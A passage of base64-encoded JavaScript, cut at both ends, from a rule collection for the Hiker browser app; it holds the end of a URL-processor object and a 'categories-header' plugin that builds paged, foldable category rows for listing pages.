xcbiAgICAgICAgICAgIGxldCB1cmxFeHAgPSByZWdPYmoucmVnO1xcbiAgICAgICAgICAgIGlmICh0eXBlb2YgdXJsRXhwID09PSAnc3RyaW5nJykge1xcbiAgICAgICAgICAgICAgICB1cmxFeHAgPSBuZXcgUmVnRXhwKHVybEV4cClcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgaWYgKHVybEV4cC50ZXN0KHRoaXMucGFyYW1zLnVybCkpIHtcXG4gICAgICAgICAgICAgICAgaWYgKHRoaXMucGFyYW1zLmRlYnVnKSB7XFxuICAgICAgICAgICAgICAgICAgICBsb2codXJsRXhwLnRvU3RyaW5nKCkpXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgdHJ1ZV91cmwgPSByZWdPYmouZXhlYygpO1xcbiAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICB9XFxuICAgICAgICB9XFxuICAgICAgICBpZiAodHJ1ZV91cmwpIHtcXG4gICAgICAgICAgICByZXR1cm4gdHJ1ZV91cmw7XFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHJldHVybiB0aGlzLnBhcmFtcy51cmxcXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAg6I635Y+W5aSE55CG57uT5p6cKCkge1xcbiAgICAgICAgcmV0dXJuIHRoaXMuZXhlYygpXFxuICAgIH0sXFxuICAgIOmTvuaOpSh1cmwpIHtcXG4gICAgICAgIHJldHVybiB0aGlzLmJhc2VVcmwodXJsKVxcbiAgICB9LFxcbiAgICDpobXnoIEocGFnZSkge1xcbiAgICAgICAgcmV0dXJuIHRoaXMucGFnZShwYWdlKVxcbiAgICB9LFxcbiAgICDmj5LlhaXmlrDlpITnkIbop4TliJkocmVnRXhwKSB7XFxuICAgICAgICByZXR1cm4gdGhpcy5hZGRFeHRyYShyZWdFeHApXFxuICAgIH0sXFxuICAgIOiwg+ivleaooeW8jygpIHtcXG4gICAgICAgIHJldHVybiB0aGlzLmRlYnVnKCk7XFxuICAgIH1cXG59KVxcbiQuZXhwb3J0cz1uZXcgVXJsUHJvY2Vzc29yKClcXG4kLmV4cG9ydHNcXG5cIn0se1wiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcIm5hbWVcIjpcIuWKqOaAgVvkuIBdKlwiLFwicGF0aFwiOlwiY2F0ZWdvcmllcy1oZWFkZXJcIixcInJ1bGVcIjpcIi8qKlxcbiAqIOacrOWcsOe9kemhteaPkuS7tumTvuaOpSBoaWtlcjovL2ZpbGVzL3J1bGVzL2pzL2NhdGVnb3JpZXMtaGVhZGVyLmpzXFxuICog5a2Q6aG16Z2i6ZO+5o6lIGhpa2VyOi8vcGFnZS9jYXRlZ29yaWVzLWhlYWRlclxcbiAqIOmBk+mVv+S7k+W6k+mTvuaOpSBodHRwOi8vaGlrZXIubm9raWEucHJlc3MvaGlrZXJ1bGUvcnVsZWxpc3QuanNvbj9pZD0yNzA1XFxuICog56CB5LqRIEdpdGVlIOmTvuaOpSBodHRwczovL2dpdGVlLmNvbS9yZWJvcm4wL0hpa2VyUnVsZXMvcmF3L21hc3Rlci9wbHVnaW5zL2NhdGVnb3JpZXMtaGVhZGVyLmpzXFxuICovXFxuLyoqXFxuICogT2JqZWN0LmFzc2lnbiDnlKjms5Xlj4LogIPpk77mjqVcXG4gKlxcbiAqIDEuaHR0cHM6Ly93d3cuZGFpbWFqaWFvbGl1LmNvbS9kYWltYS80NzEzOWE5ZTcxMDA0MDdcXG4gKiAyLmh0dHBzOi8vc2VnbWVudGZhdWx0LmNvbS9hLzExOTAwMDAwMTE3Nzg4NzVcXG4gKiAzLmh0dHBzOi8vZGV2ZWxvcGVyLm1vemlsbGEub3JnL3poLUNOL2RvY3MvV2ViL0phdmFTY3JpcHQvUmVmZXJlbmNlL0dsb2JhbF9PYmplY3RzL09iamVjdC9hc3NpZ25cXG4gKi9cXG4vLyDliKnnlKggU3ltYm9sIOWunueOsOengeacieWPmOmHj+WSjOengeacieaWueazle+8jOWklueVjOS4jeWPr+iuv+mXru+8iOWPguiAg+mTvuaOpTLvvIlcXG5jb25zdCBzeW1ib2xNYXAgPSB7XFxuICAgIC8vIGNoZWNrUGFyYW1zOiBTeW1ib2woJ2NoZWNrUGFyYW1zJyksXFxuICAgIG1MYXlvdXQ6IFN5bWJvbCgnbUxheW91dCcpLFxcbiAgICB0cnVlX3VybDogU3ltYm9sKCd0cnVlX3VybCcpLFxcbiAgICBtUGFnZTogU3ltYm9sKCdtUGFnZScpLFxcbiAgICBzcmM6IFN5bWJvbCgnc3JjJyksXFxuICAgIHJ1bGVPYmpMaXN0OiBTeW1ib2woJ3J1bGVPYmpMaXN0JyksXFxuICAgIG1Gb2xkOiBTeW1ib2woJ21Gb2xkJyksXFxuICAgIG1Gb2xkSW5uZXJFbmFibGU6IFN5bWJvbCgnbUZvbGRJbm5lckVuYWJsZScpLFxcbiAgICBtRm9sZEluZGV4OiBTeW1ib2woJ21Gb2xkSW5kZXgnKSxcXG4gICAgbUZvbGRMYXlvdXQ6IFN5bWJvbCgnbUZvbGRMYXlvdXQnKSxcXG4gICAgbUNvbG9yOiBTeW1ib2woJ21Db2xvcicpLFxcbiAgICBtVGFnOiBTeW1ib2woJ21UYWcnKSxcXG59XFxuXFxuZnVuY3Rpb24gQ2F0ZWdvcmllc0hlYWRlcihjb2xvcikge1xcbiAgICAvLyAndXNlIHN0cmljdCc7XFxuICAgIC8vIC4uLlxcbiAgICAvLyB0aGlzW3N5bWJvbE1hcC5saXN0UnVsZV0gPSBbXVxcbiAgICAvLyB0aGlzW3N5bWJvbE1hcC5zdWJMaXN0UnVsZV0gPSBbXVxcbiAgICB0aGlzW3N5bWJvbE1hcC5tQ29sb3JdID0gY29sb3IgfHwgXFxcIiNGQTcyOThcXFwiO1xcbiAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF0gPSBbXVxcbiAgICB0aGlzLlZBUk1BUCA9IHtcXG4gICAgICAgIENBVEVHT1JZOiBcXFwiaGVhZGVyLmNhdGVnb3J5XFxcIixcXG4gICAgICAgIFVSTDogXFxcImhlYWRlci51cmxcXFwiLFxcbiAgICAgICAgRk9MRDogXFxcImhlYWRlci5mb2xkXFxcIixcXG4gICAgfVxcbiAgICB0aGlzW3N5bWJvbE1hcC5tRm9sZExheW91dF0gPSB7XFxuICAgICAgICBpbmplY3RJbmRleDogMVxcbiAgICB9XFxuICAgIHRoaXNbc3ltYm9sTWFwLm1Gb2xkSW5kZXhdID0gMVxcbn1cXG5cXG5PYmplY3QuYXNzaWduKENhdGVnb3JpZXNIZWFkZXIucHJvdG90eXBlLCB7XFxuICAgIC8vIE92ZXJyaWRlIOaehOmAoOaWueazle+8jOebuOW9k+S6jiBmdW5jdGlvbi5wcm90b3R5cGUuY29uc3RydWN0b3IgPSAoLi4uKSA9PiB7Li4ufe+8jG5ldyBmdW5jdGlvbigpIOeahOaXtuWAmeS8muiHquWKqOaJp+ihjFxcbiAgICBjb25zdHJ1Y3RvcjogQ2F0ZWdvcmllc0hlYWRlcixcXG4gICAgLy8g5a6a5LmJ56eB5pyJ5pa55rOVXFxuICAgIFZFUlNJT046IDIwMjExMTMwMTkwMCxcXG4gICAgY2hlY2tQYXJhbXMoKSB7XFxuICAgICAgICBpZiAoIXRoaXNbc3ltYm9sTWFwLm1MYXlvdXRdKSB7XFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXCLor7fosIPnlKggbGF5b3V0KGQpIOS8oOWFpeW9k+WJjeeVjOmdolxcXCIpXFxuICAgICAgICB9XFxuICAgICAgICBpZiAoIXRoaXNbc3ltYm9sTWFwLnRydWVfdXJsXSkge1xcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwi6K+36LCD55SoIHRydWVVcmwodXJsKSDkvKDlhaXlvZPliY3liIbnsbvnmoTpk77mjqVcXFwiKVxcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKCF0aGlzW3N5bWJvbE1hcC5tUGFnZV0pIHtcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcIuivt+iwg+eUqCBwYWdlKG1QYWdlKSDkvKDlhaXlvZPliY3pobXmlbBcXFwiKVxcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XS5sZW5ndGggPCAxKSB7XFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXCLor7fosIPnlKjnm7jlhbPmlrnms5XkvKDlhaXlrprkvY3op4TliJlcXFwiKVxcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKCF0aGlzW3N5bWJvbE1hcC5tRm9sZF0pIHtcXG4gICAgICAgICAgICB0aGlzW3N5bWJvbE1hcC5tRm9sZF0gPSAnMCdcXG4gICAgICAgIH1cXG4gICAgfSxcXG4gICAgbGF5b3V0KG1MYXlvdXQpIHtcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLm1MYXlvdXRdID0gbUxheW91dFxcbiAgICAgICAgcmV0dXJuIHRoaXNcXG4gICAgfSxcXG4gICAgdHJ1ZVVybCh1cmwpIHtcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLnRydWVfdXJsXSA9IHVybFxcbiAgICAgICAgcmV0dXJuIHRoaXNcXG4gICAgfSxcXG4gICAgcGFnZShtUGFnZSkge1xcbiAgICAgICAgaWYgKHR5cGVvZiAobVBhZ2UpID09PSAnc3RyaW5nJykge1xcbiAgICAgICAgICAgIG1QYWdlID0gcGFyc2VJbnQobVBhZ2UpXFxuICAgICAgICB9XFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5tUGFnZV0gPSBtUGFnZVxcbiAgICAgICAgcmV0dXJuIHRoaXNcXG4gICAgfSxcXG4gICAgaHRtbChtU3JjKSB7XFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5zcmNdID0gbVNyY1xcbiAgICAgICAgcmV0dXJuIHRoaXNcXG4gICAgfSxcXG4gICAgbGlzdChydWxlKSB7XFxuICAgICAgICBpZiAodGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdLmxlbmd0aCA+IDApIHtcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcImxpc3QocnVsZSkgYWRkKHJ1bGVPYmopIOWPquiDveS6jOmAieS4gO+8gVxcXCIpXFxuICAgICAgICB9XFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF0gPSBbe31dXFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0ubGlzdFJ1bGUgPSBydWxlXFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF1bJ+S4gOe6p+WIhuexuyddID0gcnVsZVxcbiAgICAgICAgcmV0dXJuIHRoaXNcXG4gICAgfSxcXG4gICAgc3ViTGlzdChydWxlKSB7XFxuICAgICAgICBpZiAodGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdLmxlbmd0aCA+IDEpIHtcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcInN1Ykxpc3QocnVsZSkgYWRkKHJ1bGVPYmopIOWPquiDveS6jOmAieS4gO+8gVxcXCIpXFxuICAgICAgICB9XFxuICAgICAgICBpZiAoIXRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXSB8fCAoIXRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXS5saXN0UnVsZSAmJiAhdGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdWzBdWyfkuIDnuqfliIbnsbsnXSkpIHtcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcIuivt+WFiOiwg+eUqCBsaXN0KHJ1bGUpIOaIliDkuIDnuqfliIbnsbsocnVsZSkg5a6a5L2N5LiA57qn5YiG57G7XFxcIilcXG4gICAgICAgIH1cXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXS5zdWJMaXN0UnVsZSA9IHJ1bGVcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXVsn5a2Q5YiG57G7J10gPSBydWxlXFxuICAgICAgICByZXR1cm4gdGhpc1xcbiAgICB9LFxcbiAgICB0aXRsZShydWxlKSB7XFxuICAgICAgICBpZiAodGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdLmxlbmd0aCA+IDEpIHtcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcInRpdGxlKHJ1bGUpIGFkZChydWxlT2JqKSDlj6rog73kuozpgInkuIDvvIFcXFwiKVxcbiAgICAgICAgfVxcbiAgICAgICAgaWYgKCF0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0gfHwgKCF0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0ubGlzdFJ1bGUgJiYgIXRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXVsn5LiA57qn5YiG57G7J10pKSB7XFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXCLor7flhYjosIPnlKggbGlzdChydWxlKSDmiJYg5LiA57qn5YiG57G7KHJ1bGUpIOWumuS9jeS4gOe6p+WIhuexu1xcXCIpXFxuICAgICAgICB9XFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF0udGl0bGVSdWxlID0gcnVsZVxcbiAgICAgICAgdGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdWzBdWyfliIbnsbvmoIfpopgnXSA9IHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XVswXS50aXRsZVJ1bGVcXG4gICAgICAgIHJldHVybiB0aGlzXFxuICAgIH0sXFxuICAgIHVybChydWxlKSB7XFxuICAgICAgICBpZiAodGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdLmxlbmd0aCA+IDEpIHtcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcInVybChydWxlKSBhZGQocnVsZU9iaikg5Y+q6IO95LqM6YCJ5LiA77yBXFxcIilcXG4gICAgICAgIH1cXG4gICAgICAgIGlmICghdGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdWzBdIHx8ICghdGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdWzBdLmxpc3RSdWxlICYmICF0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF1bJ+S4gOe6p+WIhuexuyddKSkge1xcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwi6K+35YWI6LCD55SoIGxpc3QocnVsZSkg5oiWIOS4gOe6p+WIhuexuyhydWxlKSDlrprkvY3kuIDnuqfliIbnsbtcXFwiKVxcbiAgICAgICAgfVxcbiAgICAgICAgdGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdWzBdLnVybFJ1bGUgPSBydWxlXFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF1bMF1bJ+WIhuexu+mTvuaOpSddID0gdGhpc1tzeW1ib2xNYXAucnVsZU9iakxpc3RdWzBdLnVybFJ1bGVcXG4gICAgICAgIHJldHVybiB0aGlzXFxuICAgIH0sXFxuICAgIC8qKlxcbiAgICAgKiDmmK/lkKblvIDlkK/mipjlj6Dlip/og71cXG4gICAgICpcXG4gICAgICogQHBhcmFtIGVuYWJsZWQgdHJ1ZSDooajnpLrlvIDlkK/vvIxmYWxzZSDooajnpLrnpoHnlKhcXG4gICAgICogQHJldHVybnMge0NhdGVnb3JpZXNIZWFkZXJ9XFxuICAgICAqL1xcbiAgICBmb2xkSW5uZXIoZW5hYmxlZCkge1xcbiAgICAgICAgaWYgKCEodHlwZW9mIChlbmFibGVkKSA9PT0gJ2Jvb2xlYW4nKSkge1xcbiAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwi6K+35Lyg5YWlIHRydWUg5oiWIGZhbHNlIOihqOekuuW8gOWQr+aIluWFs+mXreaKmOWPoOWKn+iDve+8gVxcXCIpXFxuICAgICAgICB9XFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5tRm9sZElubmVyRW5hYmxlXSA9IGVuYWJsZWRcXG4gICAgICAgIHJldHVybiB0aGlzXFxuICAgIH0sXFxuICAgIC8qKlxcbiAgICAgKiDku47nrKwgaW5kZXgg6KGM5byA5aeL5oqY5Y+gXFxuICAgICAqXFxuICAgICAqIEBwYXJhbSBpbmRleCDlvIDlp4vmipjlj6DnmoTooYzmlbBcXG4gICAgICogQHJldHVybnMge0NhdGVnb3JpZXNIZWFkZXJ9XFxuICAgICAqL1xcbiAgICBmb2xkSW5kZXgoaW5kZXgpIHtcXG4gICAgICAgIGlmICghKHR5cGVvZiAoaW5kZXgpID09PSAnbnVtYmVyJykpIHtcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcIuW8gOWni+aKmOWPoOihjOivt+S8oOWFpeaVsOWtl++8gVxcXCIpXFxuICAgICAgICB9XFxuICAgICAgICBpZiAoaW5kZXggPCAxKSB7XFxuICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXCLlvIDlp4vmipjlj6DooYzor7fkvKDlhaXlpKfkuo4gMCDnmoTmlbTmlbDvvIFcXFwiKVxcbiAgICAgICAgfVxcbiAgICAgICAgdGhpc1tzeW1ib2xNYXAubUZvbGRJbmRleF0gPSBpbmRleCB8fCAxO1xcbiAgICAgICAgcmV0dXJuIHRoaXNcXG4gICAgfSxcXG4gICAgLyoqXFxuICAgICAqIOaKmOWPoOaMiemSrueahOeVjOmdolxcbiAgICAgKlxcbiAgICAgKiBAcGFyYW0gbGF5b3V0IOS4jiBkLnB1c2gg57uT5p6E5LiA6Ie077yMXFxuICAgICAqICAgICAgICDkvovvvJp7IHRpdGxlOlxcXCLmoIfpopgxXFxcIiwgdXJsOlxcXCJ4eHhcXFwiLCBjb2xfdHlwZTpcXFwic2Nyb2xsX2J1dHRvblxcXCIgfTtcXG4gICAgICogICAgICAgIOWPguaVsOmHh+eUqOWPr+mAieimhuebluaooeW8j++8jOS4jeWGmeeahOWPguaVsOWImeS9v+eUqOm7mOiupDtcXG4gICAgICogICAgICAgIOavlOWmguS8oOWFpSB7IGNvbF90eXBlOlxcXCJ0ZXh0XzFcXFwiIH3vvIzpgqPmnIDnu4jnu5PmnpzlsLHmmK8geyB0aXRsZTpcXFwi5qCH6aKYMVxcXCIsIHVybDpcXFwieHh4XFxcIiwgY29sX3R5cGU6XFxcInRleHRfMVxcXCIgfVxcbiAgICAgKiBAcmV0dXJucyB7Q2F0ZWdvcmllc0hlYWRlcn1cXG4gICAgICovXFxuICAgIGZvbGRMYXlvdXQobGF5b3V0KSB7XFxuICAgICAgICBpZiAodHlwZW9mIGxheW91dCA9PT0gJ29iamVjdCcpIHtcXG4gICAgICAgICAgICBsZXQga2V5cyA9IE9iamVjdC5rZXlzKGxheW91dClcXG4gICAgICAgICAgICBsZXQgaW5qZWN0SW5kZXggPSBsYXlvdXQuaW5qZWN0SW5kZXggfHwgbGF5b3V0Wyfmipjlj6DmjInpkq7mj5LlhaXooYwnXVxcbiAgICAgICAgICAgIGlmIChsYXlvdXQudGl0bGUgfHwgbGF5b3V0LnVybCB8fCBsYXlvdXQuY29sX3R5cGUgfHwgaW5qZWN0SW5kZXgpIHtcXG4gICAgICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBrZXlzLmxlbmd0aDsgaSsrKSB7XFxuICAgICAgICAgICAgICAgICAgICBjb25zdCBrZXkgPSBrZXlzW2ldXFxuICAgICAgICAgICAgICAgICAgICB0aGlzW3N5bWJvbE1hcC5tRm9sZExheW91dF1ba2V5XSA9IGxheW91dFtrZXldO1xcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICAgICAgdGhyb3cgbmV3IEVycm9yKFxcXCLor7fkvKDlhaXmraPnoa7nmoTmipjlj6DnlYzpnaLlhYPntKDvvIFcXFwiKVxcbiAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAvLyBpbmplY3RJbmRleCDmipjlj6DmjInpkq7mj5LlhaXnrKwgaW5qZWN0SW5kZXgg6KGMXFxuICAgICAgICAgICAgaWYgKGluamVjdEluZGV4KSB7XFxuICAgICAgICAgICAgICAgIGlmICghKHR5cGVvZiAoaW5qZWN0SW5kZXgpID09PSAnbnVtYmVyJykpIHtcXG4gICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwi5oqY5Y+g5oyJ6ZKu5o+S5YWl6KGM6K+35Lyg5YWl5pWw5a2X77yBXFxcIilcXG4gICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICBpZiAoaW5qZWN0SW5kZXggPCAxKSB7XFxuICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcIuaKmOWPoOaMiemSruaPkuWFpeihjOivt+S8oOWFpeWkp+S6jiAwIOeahOaVtOaVsO+8gVxcXCIpXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgaWYgKGluamVjdEluZGV4ID4gdGhpc1tzeW1ib2xNYXAubUZvbGRJbmRleF0pIHtcXG4gICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcihcXFwi5oqY5Y+g5oyJ6ZKu5o+S5YWl6KGM5LiN5b6X5aSn5LqO5pi+56S65oqY5Y+g6KGM5pWw77yB6K+36LCD55SoIC5mb2xkSW5kZXgoaW5kZXgpIOaIliAu56ys5Yeg6KGM5byA5aeL5oqY5Y+gKGluZGV4KSDkvKDlhaXmraPnoa7nmoTmmL7npLrmipjlj6DooYzmlbBcXFwiKVxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLm1Gb2xkTGF5b3V0XS5pbmplY3RJbmRleCA9IGluamVjdEluZGV4IHx8IDE7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoXFxcIuivt+S8oOWFpeato+ehrueahOaKmOWPoOeVjOmdouWFg+e0oO+8gVxcXCIpXFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gdGhpcztcXG4gICAgfSxcXG4gICAgLy8g5b2T5YmN5piv5ZCm5oqY5Y+gXFxuICAgIGZvbGQoaXNGb2xkKSB7XFxuICAgICAgICBpZiAodHlwZW9mIChpc0ZvbGQpID09PSAnc3RyaW5nJykge1xcbiAgICAgICAgICAgIGlzRm9sZCA9IGlzRm9sZCA9PT0gJzEnXFxuICAgICAgICB9XFxuICAgICAgICBpZiAoaXNGb2xkKSB7XFxuICAgICAgICAgICAgdGhpc1tzeW1ib2xNYXAubUZvbGRdID0gJzEnO1xcbiAgICAgICAgfSBlbHNlIHtcXG4gICAgICAgICAgICB0aGlzW3N5bWJvbE1hcC5tRm9sZF0gPSAnMCc7XFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gdGhpc1xcbiAgICB9LFxcbiAgICBjb2xvcihtQ29sb3IpIHtcXG4gICAgICAgIHRoaXNbc3ltYm9sTWFwLm1Db2xvcl0gPSBtQ29sb3JcXG4gICAgICAgIHJldHVybiB0aGlzXFxuICAgIH0sXFxuICAgIHRhZyhtVGFnKSB7XFxuICAgICAgICB0aGlzW3N5bWJvbE1hcC5tVGFnXSA9IG1UYWdcXG4gICAgICAgIHJldHVybiB0aGlzXFxuICAgIH0sXFxuICAgIGFkZChydWxlT2JqKSB7XFxuICAgICAgICAvLyBsb2coJC5zdHJpbmdpZnkocnVsZU9iaikpXFxuICAgICAgICBpZiAocnVsZU9iai5jb25zdHJ1Y3RvciA9PT0gQXJyYXkpIHtcXG4gICAgICAgICAgICB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF0gPSB0aGlzW3N5bWJvbE1hcC5ydWxlT2JqTGlzdF0uY29uY2F0KHJ1bGVPYmopXFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHRoaXNbc3ltYm9sTWFwLnJ1bGVPYmpMaXN0XS5wdXNoKHJ1bGVPYmopXFxuICAgICAgICB9XFxuICAgICAgICByZXR1cm4gdGhpcztcXG4gICAgfSxcXG4gICAgZXZhbEpTUnVsZShpdGVtLCBqc1J1bGUpIHtcXG4gICAgICAgIGxldCBydWxlID0ganNSdWxlLnJlcGxhY2UoXFxcIkBqczpcXFwiLCBcXFwiXFxcIilcXG4gICAgICAgIHJ1bGUgPSBydWxlLnRyaW0oKVxcbiAgICAgICAgLy8gbG9nKCQuc3RyaW5naWZ5KHJ1bGUpKVxcbiAgICAgICAgbGV0IGlucHV0ID0gaXRlbVxcbiAgICAgICAgaWYgKHJ1bGUuc3RhcnRzV2l0aChcXFwiKFxcXCIpKSB7XFxuICAgICAgICAgICAgZXZhbCgncmVzdWx0ID0gJyArIHJ1bGUpXFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIC8qKlxcbiAgICAgICAgICAgICAqIOi/mOWOn+aIkCAkLnRvU3RyaW5nKC4uLikg55qE5pyA57uI57uT5p6c77yM6L6+5Yiw5pyA57uI5aSE55CG5pa55byP6Lef5LiK6Z2i55qEIGlmIOS4gOiHtOeahOebrueahFxcbiAgICAgICAgICAgICAqL1xcbiAgICAgICAgICAgIGV2YWwoJ3Jlc3VsdCA9ICcgKyAnKCgpID0+IHsnICsgcnVsZSArICd9KSgpJylcXG4gICAgICAgIH1cXG4gICAgICAgIHJldHVybiAocmVzdWx0IHx8ICcnKVxcbiAgICB9LFxcbiAgICBnZXRUaXRsZShzcmMsIGNhdGVnb3J5KSB7XFxuICAgICAgICBsZXQgdGl0bGUgPSAnJ1xcbiAgICAgICAgbGV0IHRpdGxlUnVsZSA9IGNhdGVnb3J5LnRpdGxlUnVsZSB8fCAnYSYmVGV4dCdcXG4gICAgICAgIGlmICh0aXRsZVJ1bGUuc3RhcnRzV2l0aChcXFwiQGpzOlxcXCIpKSB7XFxuICAgICAgICAgICAgdGl0bGUgPSB0aGlzLmV2YWxKU1J1bGUoc3JjLCB0aXRsZVJ1bGUpXFxuICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgIHRpdGxlID0gcGFyc2VEb21Gb3JIdG1sKHNyYywgdGl0bGVSdWxlKVxcbiAgICAgICAgfVxcbiAgICAgICAgcmV0dXJuIHRpdGxlIHx8IFxcXCJcXFwiO1xcbiAgICB9LFxcbiAgICBnZXRVcmwoc3JjLCBjYXRlZ29yeSkge1xcbiAgICAgICAgbGV0IHVybCA9ICcnXFxuICAgICAgICBsZXQgdXJsUnVsZSA9IGNhdGVnb3J5LnVybFJ1bGUgfHwgJ2EmJmhyZWYnXFxuICAgICAgICBpZiAodHlwZW9mIHVybFJ1bGUgPT09ICdvYmplY3QnKSB7XFxuICAgICAgICAgICAgbGV0IG1VcmxSdWxlID0gdXJsUnVsZS5ydWxlIHx8IHVybFJ1bGVbJ+ino+aekOinhOWImSddIHx8ICdhJiZocmVmJztcXG4gICAgICAgICAgICBpZiAobVVybFJ1bGUuc3RhcnRzV2l0aChcXFwiQGpzOlxcXCIpKSB7XFxuICAgICAgICAgICAgICAgIHVybCA9IHRoaXMuZXZhbEpTUnVsZShzcmMsIG1VcmxSdWxlKTtcXG4gICAgICAgICAgICB9IGVsc2Uge1xcbiAgICAgICAgICAgICAgICBsZXQgcGFyc2UgPSBwYXJzZURvbTtcXG4gICAgICAgICAgICAgICAgaWYgKHVybFJ1bGUucGFyc2VPcHRpb24pIHtcXG4gICAgICAgICAgICAgICAgICAgIHN3aXRjaCAodXJsUnVsZS5wYXJzZU9wdGlvbikge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcInBhcnNlRG9tXFxcIjpcXG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFxcXCJwZFxcXCI6XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlID0gcGFyc2VEb207XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcInBhcnNlRG9tRm9ySHRtbFxcXCI6XFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcXFwicGRmaFxcXCI6XFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlID0gcGFyc2VEb21Gb3JIdG1sO1xcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcXG4gICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0OlxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZSA9IHBhcnNlRG9tO1xcbiAgICAgICAgICAgICAgICAgICAgfVxcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHVybFJ1bGVbXFxcIuino+aekOaWueazlVxcXCJdKSB7XFxuICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKHVybFJ1bGVbXFxcIuino+aekOaWueazlVxcXCJdKSB7XFxuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcXFwicGFyc2VEb21cXFwiOlxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXFxcInBkXFxcIjpcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFyc2UgPSBwYXJzZURvbTtcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XFxuICAgICAgICAgICAgICAgICAgICAgI